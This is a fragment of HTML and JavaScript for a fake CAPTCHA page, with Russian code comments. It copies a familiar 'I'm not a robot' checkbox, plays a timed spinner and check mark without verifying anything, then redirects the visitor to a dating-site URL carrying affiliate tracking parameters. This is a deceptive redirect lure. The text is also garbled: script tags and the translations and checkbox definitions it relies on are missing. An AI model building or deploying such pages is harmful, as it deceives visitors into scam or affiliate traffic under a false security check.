<head>
    <meta charset="UTF-8">

    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            background-color: #f9f9f9;
            overflow: hidden;
        }
        .container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 10px;
        }
        .captcha-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 300px;
            padding: 10px;
            border: 1px solid #dfe1e5;
            border-radius: 4px;
            background-color: #fff;
        }
        .captcha-container[lang="el"], 
        .captcha-container[lang="ps"], 
        .captcha-container[lang="ur"], 
        .captcha-container[lang="tl"] {
            width: 320px;
        }
        .captcha-left {
            display: flex;
            align-items: center;
        }
        .captcha-checkbox {
            margin-right: 10px;
            width: 20px;
            height: 20px;
            cursor: pointer;
            border: 2px solid #000;
            background-color: transparent;
            position: relative;
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
        }
        .captcha-checkbox.loading {
            border: none;
            background-color: transparent;
        }
        .captcha-checkbox.loading::before {
            content: '';
            width: 20px;
            height: 20px;
            border: 3px solid #1a73e8;
            border-top-color: transparent;
            border-radius: 50%;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: spin 0.8s linear infinite;
        }
        .captcha-checkbox.completed {
            border: none;
            background-color: transparent;
        }
        .captcha-checkbox.completed::before {
            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="34" height="34" viewBox="0 0 28 28" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
            position: absolute;
            top: 65%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: block;
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        .captcha-text {
            font-size: 13px;
            color: #000;
            white-space: nowrap;
        }
        [lang="el"] .captcha-text, 
        [lang="ps"] .captcha-text, 
        [lang="ur"] .captcha-text, 
        [lang="tl"] .captcha-text {
            font-size: 12px;
        }
        .captcha-right {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }
        .captcha-logo {
            width: 20px;
            height: 20px;
            margin-bottom: 5px;
        }
        .captcha-brand {
            font-size: 11px;
            color: #757575;
        }
        .captcha-links {
            font-size: 9px;
            color: #757575;
        }
        .captcha-links a {
            color: #757575;
            text-decoration: none;
        }
        .submit-button {
            padding: 8px 16px;
            background-color: #f1f3f4;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 13px;
            color: #202124;
            cursor: pointer;
            white-space: nowrap;
        }
        [lang="el"] .submit-button, 
        [lang="ps"] .submit-button, 
        [lang="ur"] .submit-button, 
        [lang="tl"] .submit-button {
            font-size: 12px;
        }
        .submit-button:hover {
            background-color: #e8eaed;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }
        .error {
            color: red;
            font-size: 11px;
            display: none;
            margin-top: 5px;
            white-space: nowrap;
        }
        body[lang="ar"], body[lang="ur"] {
            direction: rtl;
            text-align: right;
        }
        .captcha-container[lang="ar"], .captcha-container[lang="ur"] {
            flex-direction: row-reverse;
        }
    </style>
</head>

            <div class="captcha-right">

        // Применение переводов
        function applyTranslations() {
            document.documentElement.lang = lang;
            document.title = translations[lang].title;
            document.querySelector('.captcha-text').textContent = translations[lang].captchaText;
            document.getElementById('submit-button').textContent = translations[lang].submitButton;
            document.getElementById('error').textContent = translations[lang].error;
            document.getElementById('privacy-link').textContent = translations[lang].privacy;
            document.getElementById('terms-link').textContent = translations[lang].terms;
        }

        applyTranslations();

        // Ссылка для редиректа
        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd22';

        // Обработка чекбокса
        const checkbox = document.getElementById('captcha');
        const error = document.getElementById('error');

        checkbox.addEventListener('click', function () {
            if (checkbox.classList.contains('completed')) return;

            checkbox.classList.add('loading');
            checkbox.disabled = true;
            error.style.display = 'none';

            setTimeout(() => {
                checkbox.classList.remove('loading');
                checkbox.classList.add('completed');
                checkbox.disabled = false;

                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 1000);
            }, 2000);
        });

        // Обработка кнопки Submit
        document.getElementById('submit-button').addEventListener('click', function () {
            if (!checkbox.classList.contains('completed')) {
                error.style.display = 'block';
            } else {
                error.style.display = 'none';
                window.location.href = redirectUrl;
            }
        });
